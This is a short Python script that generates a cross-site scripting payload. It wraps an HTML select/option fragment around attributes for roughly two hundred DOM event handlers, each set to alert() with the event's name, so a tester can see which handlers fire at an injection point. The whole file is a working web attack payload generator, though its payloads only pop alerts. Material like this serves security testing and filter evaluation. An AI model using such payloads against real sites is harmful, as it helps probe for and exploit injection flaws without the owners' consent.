#replace prefix and suffix with your own HTML before and after the injection point
prefix =  """
    <html>
	<select name="selectedName" multiple="multiple" size="10" ondblclick="doubleClickRemove(this)" style="width: 240px;">
	<option value="name" style="font-size:60px;"
	"""
attack = ""

events = "DOMContentLoaded,DOMFrameContentLoaded,DOMMouseScroll,DOMMenuItemActive,DOMMenuItemInactive,FSCommand,formchange,forminput,invalid,msVisibilityChange,onAbort,onActivate,onAfterPrint,onAfterUpdate,onAttrModified,onAfterScriptExecute,onBack,onBeforeActivate,onBeforeCopy,onBeforeCut,onBeforeDeactivate,onBeforeEditFocus,onBeforePaste,onBeforePrint,onBeforeScriptExecute,onBeforeUnload,onBeforeUpdate,onBegin,onBlur,onBounce,onBroadcast,onCanPlay,onCanPlayThrough,onCellChange,onChange,onCharacterDataModified,onClick,onClose,onCommand,oncontentsave,oncontentready,onCommandUpdate,onContextMenu,onControlSelect,onCopy,onCut,onDataAvailable,onDataSetChanged,onDataSetComplete,onDblClick,onDeactivate,ondetach,ondocumentready,onDOMActivate,onDOMAttrModified,onDOMAttributeNameChanged,onDOMCharacterDataModified,onDOMElementNameChanged,onDOMFocusIn,onDOMFocusOut,onDOMNodeInserted,onDOMNodeInsertedIntoDocument,onDOMNodeRemoved,onDOMNodeRemovedFromDocument,onDOMSubTreeModified,onDrag,onDragDrop,onDragEnd,onDragEnter,onDragExit,onDragGesture,onDragLeave,onDragOver,onDragStart,onDrop,onDurationChange,onEmtied,onEnded,onEnd,onError,onErrorUpdate,onExit,onFilterChange,onFinish,onFocus,onFocusIn,onFocusOut,onFormChange,onFormInput,onForward,ongesturechange,ongestureend,ongesturestart,onHashChange,onHelp,onhide,onInput,onInvalid,onKeyDown,onKeyPress,onKeyUp,onLayoutComplete,onLoad,onLoadedData,onLoadedMetaData,onLoadStart,onLocate,onLoseCapture,onMediaComplete,onMediaError,onMessage,onMouseDown,onMouseDrag,onMouseEnter,onMouseLeave,onMouseMove,onMouseMultiWheel,onMouseOut,onMouseOver,onMouseUp,onMouseWheel,onmove,onMoveEnd,onMoveStart,onmsGestureChange,onmsGestureDoubleTap,onmsGestureEnd,onmsGestureHold,onmsGestureStart,onmsGestureTap,onmsSiteModeJumpListitemRemoved,onmsSiteModeShowJumpList,onmsThumbnailClick,onNodeInserted,onNodeRemoved,onOffline,onOnline,onopenstatechanged,onorientationchange,onOutOfSync,onOverFlow,onOverFlowChanged,onPage,onPageHide,onPageShow,onPaste,onPause,onPlay,onPlaying,onplaystatechange,onPopState,onPopupHidden,onPopupHiding,onPopupShowing,onPopupShown,onProgress,onPropertyChange,onRateChange,onReadyStateChange,onRedo,onRepeat,onReset,onResize,onResizeEnd,onResizeStart,onResume,onReverse,onRowDelete,onRowEnter,onRowExit,onRowInserted,onRowsDelete,onRowsInserted,onSave,onScroll,onSearch,onSeek,onSeeked,onSeeking,onSelect,onSelection,onSelectionChange,onSelectStart,onShow,onStalled,onStart,onStop,onStorage,onStorageCommit,onSubmit,onSubTreeModified,onSuspend,onSyncRestored,onSynchRestored,onText,onTextInput,onTimeError,onTimeuout,onTimeupdate,ontouchcancel,ontouchend,ontouchenter,ontouchmove,ontouchleave,ontouchstart,onTrackChange,onUnderflow,onUndo,onUnload,onURLFlip,onVolumeChange,onWaiting,onWheel,onXfer_Done,onwebkitanimationend,onwebkitanimationiteration,onwebkitanimationstart,onwebkittransitionend,seekSegmentTime"

for e in events.split(","):
    attack += e + "=alert('" + e + "') "

suffix = """>name</option></select>
         </html>"""

print prefix + attack + suffix



